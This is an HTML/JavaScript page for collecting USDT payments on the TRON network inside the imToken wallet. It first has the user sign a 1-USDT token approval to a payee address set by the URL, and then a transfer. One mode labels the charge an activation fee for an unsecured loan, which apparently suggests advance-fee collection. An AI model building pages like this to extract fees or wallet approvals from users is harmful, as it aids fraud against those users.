<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<title>USDT 支付</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
    background:#f5f6fa;color:#12141d;line-height:1.55;
    display:flex;align-items:center;justify-content:center;
    min-height:100vh;padding:20px;
  }
  .card{
    background:#fff;border-radius:20px;padding:30px 24px;
    width:min(420px,100%);box-shadow:0 20px 60px rgba(15,17,26,.12);
    text-align:center;
  }
  h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.3px}
  .sub{font-size:13.5px;color:#8d93a6;margin-bottom:24px}
  .info{
    background:#f8f9fd;border-radius:14px;padding:18px;margin-bottom:20px;
    text-align:left;
  }
  .info-row{
    display:flex;justify-content:space-between;align-items:center;
    padding:10px 0;border-bottom:1px dashed #e8eaf1;
  }
  .info-row:last-child{border-bottom:none;padding-bottom:0}
  .info-k{font-size:13px;color:#8d93a6;flex:0 0 auto}
  .info-v{font-size:13.5px;font-weight:700;word-break:break-all;text-align:right;margin-left:12px}
  .info-v.gold{color:#f0a020;font-size:18px}
  .btn{
    display:block;width:100%;padding:15px;border-radius:14px;
    border:none;font-size:16px;font-weight:800;cursor:pointer;
    transition:.18s;margin-bottom:12px;
  }
  .btn-pay{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff}
  .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
  .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
  .btn-ghost{background:#f1f2f7;color:#5b6070}
  .status{
    padding:14px;border-radius:12px;font-size:13.5px;
    margin-top:16px;display:none;text-align:left;line-height:1.6;
  }
  .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
  .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
  .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
  .env-warn{
    padding:13px;border-radius:12px;font-size:12.5px;
    background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;
    margin-bottom:14px;line-height:1.6;text-align:left;
  }
</style>
</head>
<body>
<div class="card">
  <h1 id="page-title">USDT 支付</h1>
  <p class="sub" id="page-sub">请在 imToken 中确认支付</p>

  <div id="env-warn" class="env-warn" style="display:none">
    <div style="margin-bottom:8px">⚠️ 当前不在 imToken 环境中。</div>
    <button onclick="location.reload()" style="background:#c2410c;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;">重新检测</button>
  </div>

  <div class="info">
    <div class="info-row">
      <span class="info-k">收款地址</span>
      <span class="info-v" id="info-addr">-</span>
    </div>
    <div class="info-row">
      <span class="info-k">网络</span>
      <span class="info-v" id="info-chain">-</span>
    </div>
    <div class="info-row">
      <span class="info-k">支付金额</span>
      <span class="info-v gold" id="info-amount">-</span>
    </div>
  </div>

  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
  <button class="btn btn-ghost" id="btn-cancel">取消 / 刷新页面</button>

  <div class="status" id="status"></div>
</div>

<script>
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const params = new URLSearchParams(location.search);
const toAddress = params.get('address') || '';
const amount = Number(params.get('amount')) || 0;
const type = params.get('type') || 'deposit';

function $(s) { return document.querySelector(s); }

if (type === 'empty') {
  $('#page-title').textContent = '空放资格支付';
  $('#page-sub').textContent = '支付 1 USDT 激活空放通道';
} else {
  $('#page-title').textContent = '押金充值';
  $('#page-sub').textContent = '请在 imToken 中确认支付';
}

$('#info-addr').textContent = toAddress || '未配置';
$('#info-chain').textContent = 'TRC20 (波场)';
$('#info-amount').textContent = amount + ' USDT';

// 通用超时包装：防止安卓网络下 tronWeb 请求无限挂起（TCP 默认超时约 20-30 秒）
function withTimeout(promise, ms, msg) {
  return Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(msg || '网络超时，请重试')), ms))
  ]);
}

let envCheckCount = 0;
const MAX_ENV_CHECK = 40; // 最多检测 20 秒（安卓钱包注入 tronWeb 较慢，3 秒远远不够）
function checkEnvironment() {
  const hasTron = !!(window.tron || window.tronWeb);
  if (hasTron) {
    $('#env-warn').style.display = 'none';
    $('#btn-pay').disabled = false;
    $('#btn-pay').textContent = step === 1 ? '第 1 步：确认授权 1U' : `第 2 步：确认支付 ${amount} U`;
  } else {
    if (envCheckCount < MAX_ENV_CHECK) {
      envCheckCount++;
      // 检测超过 3 秒仍未注入时，提示正在等待钱包环境，避免用户以为卡死
      if (envCheckCount === 6) {
        $('#env-warn').style.display = 'block';
        $('#env-warn').innerHTML = '<div>⏳ 正在等待钱包注入环境，安卓设备可能需要几秒，请稍候…</div>';
      }
      setTimeout(checkEnvironment, 500);
    } else {
      $('#env-warn').style.display = 'block';
      $('#env-warn').innerHTML = '<div style="margin-bottom:8px">⚠️ 未检测到钱包环境，请确保在 imToken / TokenPocket 等支持 TRC20 的钱包内打开本页面。</div><button onclick="location.reload()" style="background:#c2410c;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;">重新检测</button>';
      $('#btn-pay').disabled = true;
    }
  }
}
let step = 1; // 1: 授权, 2: 支付（必须在 checkEnvironment 之前声明，避免 TDZ）

checkEnvironment();

$('#btn-pay').onclick = async function () {
  const btn = this;
  btn.disabled = true;
  
  if (step === 1) {
    btn.textContent = '请求授权中…';
    setStatus('loading', '第 1 步：正在连接波场节点构建授权交易，请稍候…');
    try {
      if (!window.tronWeb) throw new Error('未检测到钱包环境，请在钱包内打开');
      // 等待 tronWeb 就绪（最多 5 秒），避免安卓上 ready 尚未置位就调用导致异常
      let waited = 0;
      while (!window.tronWeb.ready && waited < 5000) {
        await new Promise(r => setTimeout(r, 200)); waited += 200;
      }
      if (!window.tronWeb.ready) throw new Error('钱包环境未就绪，请退出重新进入');
      const fromAddress = window.tronWeb.defaultAddress.base58;
      
      const approveParam = [
        { type: 'address', value: toAddress },
        { type: 'uint256', value: '1000000' }
      ];
      
      // 关键修复：构建交易是纯网络请求，安卓下可能挂起 20+ 秒，必须加超时
      const txApprove = await withTimeout(
        window.tronWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT, 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, fromAddress
        ),
        10000,
        '节点响应超时（网络较慢），请点击按钮重试，或切换 Wi-Fi / 4G 后再试'
      );
      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
      
      setStatus('loading', '✅ 授权交易已构建，请在钱包弹窗中确认授权…');
      // 签名会唤起钱包 approve 弹窗，用户需手动确认，给 120 秒足够时间
      const signedApprove = await withTimeout(
        window.tronWeb.trx.sign(txApprove.transaction),
        120000,
        '授权签名超时（您可能未在钱包中确认），请重试'
      );
      await withTimeout(
        window.tronWeb.trx.sendRawTransaction(signedApprove),
        15000,
        '广播授权交易超时，请检查网络后重试'
      );
      
      setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
      step = 2;
      btn.textContent = `第 2 步：确认支付 ${amount} U`;
      btn.disabled = false;
    } catch (e) {
      setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
      btn.textContent = '重新授权';
      btn.disabled = false;
    }
  } 
  else if (step === 2) {
    btn.textContent = '请求支付中…';
    setStatus('loading', '第 2 步：正在连接节点构建支付交易，请稍候…');
    try {
      const fromAddress = window.tronWeb.defaultAddress.base58;
      const amountUnits = Math.floor(amount * 1e6).toString();
      
      const transferParam = [
        { type: 'address', value: toAddress },
        { type: 'uint256', value: amountUnits }
      ];
      
      const txTransfer = await withTimeout(
        window.tronWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT, 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, fromAddress
        ),
        10000,
        '节点响应超时（网络较慢），请点击按钮重试，或切换 Wi-Fi / 4G 后再试'
      );
      if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败');
      
      setStatus('loading', '✅ 支付交易已构建，请在钱包弹窗中确认支付…');
      const signedTransfer = await withTimeout(
        window.tronWeb.trx.sign(txTransfer.transaction),
        120000,
        '支付签名超时（您可能未在钱包中确认），请重试'
      );
      await withTimeout(
        window.tronWeb.trx.sendRawTransaction(signedTransfer),
        15000,
        '广播支付交易超时，请检查网络后重试'
      );
      
      setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
      btn.textContent = '已完成';
    } catch (e) {
      setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
      btn.textContent = '重新支付';
      btn.disabled = false;
    }
  }
};

$('#btn-cancel').onclick = () => window.history.back();

function setStatus(type, msg) {
  const el = $('#status');
  el.className = 'status ' + type;
  el.innerHTML = msg;
}
</script>
</body>
</html>
